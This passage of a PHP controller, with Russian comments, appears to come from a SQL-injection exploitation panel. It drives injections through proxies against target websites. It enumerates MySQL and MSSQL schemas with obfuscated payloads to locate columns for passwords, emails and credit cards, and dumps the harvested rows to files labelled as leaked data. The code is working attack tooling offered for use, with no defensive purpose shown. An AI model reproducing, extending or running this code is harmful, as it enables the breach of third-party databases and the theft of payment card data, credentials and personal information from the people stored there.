							$table = $mail['TABLE_NAME'];
							$label = $mail['COLUMN_NAME'];
							$count = intval($mailcount);
							$site = $squle['Post']['url'];
							
							if($this->Post->query("INSERT INTO `fileds_one` 
								(`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`site`,`count`)
								VALUES ($post_id,'$ipbase','$ipbase2','$table','$label','$url2','$count')"))
							{
								//echo $ipbase.' - Добавлен в обработку<br>';	
							}else
							{
								//echo $ipbase.' - NO<br>';
							}
							
							
							
							
							
						}
						
						
					}
				}	
			}
		}	
		
		$this->Session->write('inject',$data);
		$this->set('data',$data);		
		$this->render('emailone');
		die();
		
	}

	function getcountmail_one_pass($id){//поиск колонок с pass - дочерняя функция
		
		
		$pass = $this->passwords;
		
		
		$field = $this->Post->query("SELECT * FROM  `fileds_one` WHERE  `post_id` =".$id);
		
		//$this->d($field,'$field');
		//exit;
		
		//$field = $this->Filed->findbyid($id);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts_one` WHERE `id` = ".$id);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts_one']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts_one']['sleep']) > 2)
		{
			$set = $squle[0]['posts_one']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj ->inject($squle['post_one']['header'].'::'.$squle[0]['posts_one']['gurl'],$squle[0],$set);
		
		
		

		
		
		
		
		foreach ($field as $pole)
			{
				//$this->d($pole,'pole');exit;
				$bd = explode(':', $pole['fileds_one']['ipbase']);
				$this->d($bd,'$bd');
				$password=':';
						
				foreach ($pass as $pps)
				{

					$this->workup();
					
					if($this->mysqlInj->mssql==true){
						
						$bd_new =  $bd[1];
						
							
						$pps = $this->mysqlInj->charcher_mssql("%$pps%");
						$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
						
						$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
						
						$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
						
					}else{
					
						$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
					
					
					}
					
					$this->d($mysql,'$mysql'); 
					
					//exit;
					if(isset($mysql['COLUMN_NAME']))
					{
						$password.= ''.$mysql['COLUMN_NAME'].':';
						
						continue(1);
					}
					
					
					//exit;
					
				}
				
				$this->d($password);

				$this->Filed->query('UPDATE  `fileds_one` SET  `password` =  "'.$password.'" WHERE  `id` ='.$pole['fileds_one']['id']);
				
				
			}
		
		
		
		
		
		
		
		
	
	}
	
	function getFieldMails_one($bd,$table){ //возвращает колонки у таблицы c мылами РАБОТАЕТ
		

		$data = $this->Session->read('inject');
		
		//$this->d($data,'data');
		$squle['Post'] = $data['posts_one'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);

		$data['bds'] = $bd;
		$data['field'][$bd][$table] = $data2;
		
		$data['table'] = $table;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('dataonemails');
		
		
	}
	
	function getFieldOrder_one($bd,$table){ //возвращает колонки у таблицы c мылами РАБОТАЕТ
		

		$data = $this->Session->read('inject');
		
		//$this->d($data,'data');
		$squle['Post'] = $data['posts_one'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);

		$data['bds'] = $bd;
		$data['field'][$bd][$table] = $data2;
		
		$data['table'] = $table;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('dataoneorder');
		
		
	}
	
	function search_restart_pass($idf){
		
		$pass = $this->passwords;
		
		flush();
		
		//$field = $this->Filed->findbyid($idf);
		
		$field = $this->Post->query("SELECT * FROM  `fileds` WHERE  `id` =".$idf);
		
		$this->d($field,'$field');
		
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field[0]['fileds']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field[0]['fileds']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'].':';
				echo   'GOOD:'.$password;
				
				continue;
			}
			
		}
		
		$this->d($password);

		$this->Filed->query('UPDATE  `fileds` SET  `password` =  "'.$password.'" WHERE  `id` ='.$idf);
		
	}
	
	function search_restart_mail($id){
		
		
			flush();
		
			$this->Post->query("UPDATE  `posts` SET  `getmail` =  0 WHERE  `posts`.`id` =".$id);
			
			echo 'еще разочек будем мыла искать';
	}
	
	function FindOrder_one($id){//поиск колонок с картами у одиночного взлома
		
		
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		//$this->d($data,'data');
		//exit;
		//$this->Session->write('inject',$data);
		
		
		$fieldcount = $this->Post->query("SELECT * FROM  `orders_one` WHERE  `post_id` =".$squle['Post']['id']);
		
		
		
		
	
		
		
		
		////////////
		
		
		if(count($fieldcount)>0)
		{
			$post_id = $data['posts_one']['id'];
			echo "<a href='/posts/shlak_card_one/$post_id'>Удалить найденные карты из кэша</a><br>";
			foreach($fieldcount as $fff)
			{
				
				$data['orders'][] = $fff['orders_one']['card2'];
				
				
				$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$fff['orders_one']['count']."</span>";	
				$card_one2 = $fff['orders_one']['bd'].'/'.$fff['orders_one']['table']."({$count_table2})/".$fff['orders_one']['column'];
				
				
				
				$str = "<a target='_blank' href='/posts/getFieldOrder_one/".$fff['orders_one']['bd'].'/'.$fff['orders_one']['table']."'  style='color:red'>Раскрыть</a>";
				//$data['emails'][] = $ipbase2;
				echo $card_one2." - ".$str."<br>";
				
				
				
				//echo $card_one2."<br>";
				
				
			}
			
			
			//$this->d($data,'$data email');			

			$this->Session->write('inject',$data);
			$this->set('data',$data);		
			$this->render('orderone');		
			exit;
			
		}
		//$this->d($squle,'$squle');exit;
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	
		

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		echo "<a href='/posts/shlak_card_one/$post_id'>Удалить найденные карты из кэша</a><br>";
		
		
		
		foreach ($cards as $pps)
		{
			$pss = trim($pps);
			
			//$this->d('ishem - '.$pps);
			
			$this->workup();
			
			//$pps ='credit_card';
			
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').') AND ( DATA_TYPE=char('.$this->charcher('char').') OR DATA_TYPE=char('.$this->charcher('varchar').') OR DATA_TYPE=char('.$this->charcher('text').'))');
			
			//$this->d($mysql_all,'mysql ALLLLL');
			//exit;
			
			if(isset($mysql_all) AND count($mysql_all) >0)
			{
				
				foreach($mysql_all as $mysql)
				{
					
					
					//$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').') AND ( DATA_TYPE=char('.$this->charcher('char').') OR DATA_TYPE=char('.$this->charcher('varchar').') OR DATA_TYPE=char('.$this->charcher('text').'))');
					
					//$this->d($mysql,'$mysql');
					
					
					
					if(isset($mysql['COLUMN_NAME']) AND $mysql['COLUMN_NAME'] !=null AND $mysql['COLUMN_NAME'] !='null')
					{
						
						
						
						if(in_array($mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'],$this->card_dubles)){
							
							//$this->d($this->card_dubles,'kuuuuuuuuu');
							continue;
						}
						
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						
						$this->tableOrder = $table;
						
						
						
						
						
						
						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						

						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
						
						if($count_table > 20)
						{
							
							
							//if (!in_array($card_one2, $data['orders'])) 
							//{
							
							
							$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
							$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/".$mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/".$mysql['COLUMN_NAME'];
							echo $card_one2."<br>";
							$data['orders'][] = $card_one2;
							
							$uniq = $this->Post->query("SELECT * FROM `orders_one` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1");
							$count = count($uniq);
							
							if($count ==0)
							{
								
								if($this->Post->query("INSERT INTO orders_one (
								`post_id`,
								`bd`,
								`table`,
								`column`,
								`count`,
								`card2`,
								`domen`) 
								
								VALUES(
								{$post_id},
								'{$bd}',
								'{$table}',
								'{$column}',
								{$count_table},
								'{$card_one_count}',
								'{$domen}')")){
									
									//$this->d('v bd uspeshno vstavleno');
								}
							}else
							{
								//$this->d("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
							}
							//}
						}
					}
					//exit;
					//sleep(1);
				}
			}
			//exit;
		}
		
		$this->Session->write('inject',$data);
		$this->set('data',$data);		
		$this->render('orderone');
		die();	

		
	}
	
	function FindOrderTable_one($id){//поиск колонок с картами у одиночного взлома
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['ordersTable']);
		
		//$this->d($data,'data');
		//exit;
		//$this->Session->write('inject',$data);
		
		
		
		$fieldcount = $this->Post->query("SELECT * FROM  `ordersTable_one` WHERE  `post_id` =".$squle['Post']['id']);
		
		
		
		
		if(count($fieldcount)>0)
		{
			$post_id = $data['posts_one']['id'];
			echo "<a href='/posts/shlak_cardTable_one/$post_id'>Удалить найденные карты(таблицы) из кэша</a><br>";
			foreach($fieldcount as $fff)
			{
				
				$data['ordersTable'][] = $fff['ordersTable_one']['card2'];
				
				
				$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$fff['ordersTable_one']['count']."</span>";	
				$card_one2 = $fff['ordersTable_one']['bd'].'/'.$fff['ordersTable_one']['table']."({$count_table2})";
				
				echo $card_one2."<br>";
				
				
			}
			
			
			//$this->d($data,'$data email');			

			$this->Session->write('inject',$data);
			//$this->set('data',$data);		
			//$this->render('orderTableone');		
			exit;
			
		}
		//$this->d($squle,'$squle');exit;
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	
		

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		echo "<a href='/posts/shlak_cardTable_one/$post_id'>Удалить найденные карты из кэша</a><br>";
		
		
		
		foreach ($cards as $pps)
		{
			$pss = trim($pps);
			
			//$this->d('ishem - '.$pps);
			
			$this->workup();
			
			//$pps ='credit_card';
			
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema','TABLES',array('TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `TABLE_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			//$this->d($mysql_all,'mysql ALLLLL');
			//exit;
			
			if(isset($mysql_all) AND count($mysql_all) >0)
			{
				
				foreach($mysql_all as $mysql)
				{
					
					
					//$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').') AND ( DATA_TYPE=char('.$this->charcher('char').') OR DATA_TYPE=char('.$this->charcher('varchar').') OR DATA_TYPE=char('.$this->charcher('text').'))');
					
					//$this->d($mysql,'$mysql');
					
					
					
					if(isset($mysql['TABLE_NAME']) AND $mysql['TABLE_NAME'] !=null AND $mysql['TABLE_NAME'] !='null')
					{
						
						
						
						if(in_array($mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'],$this->card_dubles)){
							
							//$this->d($this->card_dubles,'kuuuuuuuuu');
							continue;
						}
						
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						
						
						$this->tableOrder = $table;
						
						
						
						
						
						
						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'];
						
						
						

						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
						
						if($count_table > 20)
						{
							
							
							//if (!in_array($card_one2, $data['orders'])) 
							//{
							
							
							$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
							$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/";
							$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/";
							echo $card_one2."<br>";
							$data['orders'][] = $card_one2;
							
							$uniq = $this->Post->query("SELECT * FROM `ordersTable_one` WHERE `bd`='{$bd}' AND `table`='{$table}'  limit 1");
							$count = count($uniq);
							
							if($count ==0)
							{
								
								if($this->Post->query("INSERT INTO ordersTable_one (
								`post_id`,
								`bd`,
								`table`,
								`count`,
								`card2`,
								`domen`) 
								
								VALUES(
								{$post_id},
								'{$bd}',
								'{$table}',
								{$count_table},
								'{$card_one_count}',
								'{$domen}')")){
									
									//$this->d('v bd uspeshno vstavleno');
								}
							}else
							{
								//$this->d("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
							}
							//}
						}
					}
					//exit;
					//sleep(1);
				}
			}
			//exit;
		}
		
		$this->Session->write('inject',$data);
		$this->set('data',$data);		
		$this->render('orderone');
		die();	

		
	}
	
	function chengetable_one($bd,$table,$field){//когда кликают по чекбоксу сюда идет запрос и выводи поля field в fieldone
		
		
		$tablea = $this->Session->read('table');
		
		
		
		if($bd.'.'.$table!==$tablea)
		{
			
			$this->Session->write('table',$bd.'.'.$table);
			$this->Session->write('field',$field);
			$this->Session->write('getwhere','');
			$this->Session->write('tablecount','15');
			
		}else
		{
			
			$fileds = $this->Session->read('field');
			
			if(!isset($this->data[$field])){

				$fileds = str_replace(','.$field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
				
			}else{
				$fileds .= ','.$field;
			}
			
			
			
			
			
			$fields = explode(',', $fileds);				
			
			$i=0;
			$new = '';
			foreach ($fields as $f)
			{
				
				if(trim($f)!=='')
				{
					
					
					
					if($i==0)
					{
						$new = $f;
					}else
					{
						$new = $new.','.$f;
					}
					$i++;
					
				}	
			}
			
			
			$this->Session->write('field',$new);
			
		}
		
		
		
		$this->gettable_one();
		
		//$this->d($fileds,'$fileds');
		
		$this->layout = FALSE;
		$this->render('gettableone');
		
		
		//die();
	}
	
	function chengetable_one_mails($bd,$table,$field){//когда кликают по чекбоксу сюда идет запрос и выводи поля field в fieldone
		
		
		$tablea = $this->Session->read('table');
		
		//$this->d($bd,'$bd');
		
		if($bd.'.'.$table!==$tablea)
		{
			
			$this->Session->write('table',$bd.'.'.$table);
			$this->Session->write('field',$field);
			$this->Session->write('getwhere','');
			$this->Session->write('tablecount','15');
			
		}else
		{
			
			$fileds = $this->Session->read('field');
			
			if(!isset($this->data[$field])){

				$fileds = str_replace(','.$field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
				
			}else{
				$fileds .= ','.$field;
			}
			
			
			
			
			
			$fields = explode(',', $fileds);				
			
			$i=0;
			$new = '';
			foreach ($fields as $f)
			{
				
				if(trim($f)!=='')
				{
					
					
					
					if($i==0)
					{
						$new = $f;
					}else
					{
						$new = $new.','.$f;
					}
					$i++;
					
				}	
			}
			
			
			$this->Session->write('field',$new);
			
		}
		
		
		
		$this->gettable_one();
		
		//$this->d($fileds,'$fileds');
		
		$this->layout = FALSE;
		$this->render('gettableone_mails');
		
		
		//die();
	}
	
	function chengetable_one_orders($bd,$table,$field){//когда кликают по чекбоксу сюда идет запрос и выводи поля field в fieldone ДЛЯ КАРТ
		
		
		$tablea = $this->Session->read('table');
		
		//$this->d($bd,'$bd');
		
		
		//echo 13;
		if($bd.'.'.$table!==$tablea)
		{
			
			$this->Session->write('table',$bd.'.'.$table);
			$this->Session->write('field',$field);
			$this->Session->write('getwhere','');
			$this->Session->write('tablecount','15');
			
		}else
		{
			
			$fileds = $this->Session->read('field');
			
			if(!isset($this->data[$field])){

				$fileds = str_replace(','.$field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
				
			}else{
				$fileds .= ','.$field;
			}
			
			
			
			
			
			$fields = explode(',', $fileds);				
			
			$i=0;
			$new = '';
			foreach ($fields as $f)
			{
				
				if(trim($f)!=='')
				{
					
					
					
					if($i==0)
					{
						$new = $f;
					}else
					{
						$new = $new.','.$f;
					}
					$i++;
					
				}	
			}
			
			$this->d($new,'$new');
			
			
			$this->Session->write('field',$new);
			
		}
		
		
		
		$this->gettable_one();
		
		//$this->d($fileds,'$fileds');
		
		$this->layout = FALSE;
		$this->render('gettableone_orders');
		
		
		//die();
	}
	
	
	function getcooldata_one_now(){//дампит прям сейчас без фона может все КОЛОНКИ  NEW !!! где карты 

		
		$order = array();
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		if(count($_POST) !=0){
			$field  = array();
			foreach($_POST as $ll=>$kk){
				
				if(preg_match('/check-/',$ll))
				{
					$field[] = $kk;
					
				}
				
			}
			
		}
		
		
		
		$get['limit'] = $_POST['limit'];
		
		$this->d($_POST,'post');
		
		$bd = $_POST['bd'];
		
		$table = $_POST['table'];
		
		
		$get['desc'] =  $_POST['desc'];
		
		
		
		if($get['limit'] =='' or empty($get['limit']))
		{
			$get['limit'] = 10;	
		}
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $table;
		
		$get['bd']	  =  $bd;
		
		$get['where'] =  $this->Session->read('getwhere');
		
		$get['order'] =  $this->Session->read('getorder');
		
		
		
		//$this->d($get,'get');
		//exit;
		
		if($get['desc'] =='')
		{
			$get['desc'] = 0;
			
			
		}
		
		
		
		$get['field'] =  $field;
		
		//$this->d($get,'get');
		//exit;
		
		$data = $this->Session->read('inject');
		//$this->d($data,'$data');
		//exit;
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$this->d($set,'set');
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		
		$data2['id'] = $squle['Post']['id'];
		$data2['bd'] = $get['bd'];
		$data2['table'] = $get['table'];
		$data2['field'] = $get['field'];
		$bd = $data2['bd'];
		
		
	
		
		//$bd = $bd.":".$data2['table'];
			
		//$squle2 = $this->Post->query("SELECT * FROM  `fileds_one` WHERE `table`='".$data2['table']."' AND `post_id` ='".$squle['Post']['id']."' AND `ipbase`  like ('%$bd%') limit 0,1" );
		

		//$this->d($bd,'$bd');
		
		
		//$this->d($squle2,'$squle2');
		
		
		
		//if($this->Post->query("UPDATE  `fileds_one` SET  `get` =  '1',`pri`=1,`multi` = 1,`potok`=0,`filed`='".$data2['field']."' WHERE  `table` ='".$data2['table']."' AND `post_id` ='".$squle['Post']['id']."' AND `ipbase` like ('%$bd%')"))
		//{
			
			//$this->Post->query("DELETE FROM `multis_one` WHERE `filed_id`=".$squle2[0]['fileds_one']['id']);
			
			//echo "Мы вас поняли. скачивание БД начнемся в фоном режиме, если уже качали то перекачаем по новой !!!";
		//}else{
			//echo "Что то не ставится";
			//$this->d("UPDATE  `fileds_one` SET  `get` =  '1',`multi` = 1,`pri`=1, `filed`='".$data2['field']."' WHERE  `table` ='".$data2['table']."' AND `post_id` ='".$squle['Post']['id']."' AND `ipbase` like ('$bd%')");
			
		//}
		
		
		
		//$this->d($data,'get');
		
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		//$this->mysqlInj->desc=1;
		
		
		if($get['desc'] ==0 )
		{
			$this->mysqlInj->desc=0; // в обратном порядке
			$this->mysqlInj->desc_enable=true;
		}else{
			
			$this->mysqlInj->desc=1;//ask по идее
		}
		
		
		//$this->mysqlInj->desc=0; // в обратном порядке
		//$this->mysqlInj->desc_enable=true;
			
		
		
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		

		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],$get['field'],$get['limit'],$order,$get['where']);
		
		
		$this->d($data3,'$data3');
		
		
		foreach($data3 as $hh)
		{
			$this->d($hh);	
		}
		
		echo '<br>++++++++++++++++++++++++++++++++++++<br>';
		
		foreach($data3 as $ss=>$hh)
		{
			$this->d(implode(',',$hh));
		}
		
		
	}

    
    
	function getcooldata_one(){//выводит данные на страницу РАБОТАЕТ

		//$this->Session->write('counttable',$count);
		
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		if($get['limit'] =='' or empty($get['limit']))
		{
			$get['limit'] = 5;	
		}
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $t[1];
		
		$get['bd']	  =  $t[0];
		
		//$get['where'] =  $this->Session->read('getwhere');
		
		$get['order'] =  $this->Session->read('getorder');
        
        if($get['order'] !='' and $get['order'] !=' ')
        {
            
            $order = $get['order'];
        }else{
            $order = '';
            
        }
		
		//$get['desc'] =  $this->Session->read('getdesc');
		
       // $this->d($order,'order');
        
		//$this->d($get,'get');
		//exit;
		
		//if($get['desc'] =='' or empty($get['desc']))
		//{
			//$get['desc'] = 0;
			
		
		//}
		
		
		
		
		$get['field'] =  $this->Session->read('field');
		
		
		
		$data = $this->Session->read('inject');
		
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$this->d($set,'set');
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if($get['desc'] ==0 )
		{
			$this->mysqlInj->desc=0; // в обратном порядке
			$this->mysqlInj->desc_enable=true;
		}else{
			
			$this->mysqlInj->desc=1;//ask по идее
		}
		
		//$this->mysqlInj->desc_enable;
		
			
			
		//$this->d($get,'get');
		//exit;	
			
		
		
		//exit;
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
		
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'],$get['table'],explode(',',$get['field']),$get['limit'],$order,$get['where']);
		
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'],$get['table']);
		
		$this->Session->write('counttable',$count);
		
		
		$data = array('data'=>array($squle['Post']['id']=>$data3));
		
		
		
		$this->layout=false;

		$this->set('field',$this->Session->read('field'));
		
		$this->set('counttable',$count);
		
		$this->set('dataCOLL',$data);
		
		$this->set('inject',$data);
		
		$this->render('viewdataone');
		
	}
	
    
    function getcooldata_one_dump(){//дамп в файл

		
		$order = array();
		
		$get['limit'] = intval($this->Session->read('getlimit'));
		
		
		if($get['limit'] =='' or empty($get['limit']))
		{
			$get['limit'] = 5;	
		}
		
		$t = explode('.',$this->Session->read('table'));
		
		$get['table'] = $t[1];
		
		$get['bd']	  =  $t[0];
		
		$get['where'] =  $this->Session->read('getwhere');
		
		//$get['order'] =  $this->Session->read('getorder');
        
        $get['order']='';
         if($get['order'] !='' and $get['order'] !=' ')
        {
            
            $order = $get['order'];
        }else{
            $order = '';
            
        }
        
		
		//$get['desc'] =  $this->Session->read('getdesc');
		
		//$this->d($get,'get');
		//exit;
		
		//if($get['desc'] =='' or empty($get['desc']))
		//{
			//$get['desc'] = 0;
			
		
		//}
        
        
        //$this->d($get,'$get');
        //exit;
		
		
		
		
		$get['field'] =  $this->Session->read('field');
		
		
		
		$data = $this->Session->read('inject');
		
		
		$squle['Post'] = $data['posts_one'];
		
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$this->d($set,'set');
			$set = $squle['Post']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if($get['desc'] ==0 )
		{
			$this->mysqlInj->desc=0; // в обратном порядке
			$this->mysqlInj->desc_enable=true;
		}else{
			
			$this->mysqlInj->desc=1;//ask по идее
		}
		
		//$this->mysqlInj->desc_enable;
		
			
			
		//$this->d($get,'get');
		//exit;	
			
         $url = parse_url($squle['Post']['gurl']);   
            
		$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/".$url['host']."_".$get['bd']."_".$get['table'].".txt";	
		//$filename2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/NOCHECK/".$url['host']."_".$bd[1]."_".$mail['Filed']['table'].".txtNOCHECK";			
		$this->d($filename,'$filename');

		
		$fh = fopen($filename, "a+");
		fwrite($fh, trim($squle['Post']['gurl'])."\n");
        fclose($fh);
        
		//exit;
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);
		
        
       $count =  $this->mysqlInj ->mysqlGetCountInsert($get['bd'],$get['table']);
       
       //$this->d($count,'$count');
       //exit;
        
		
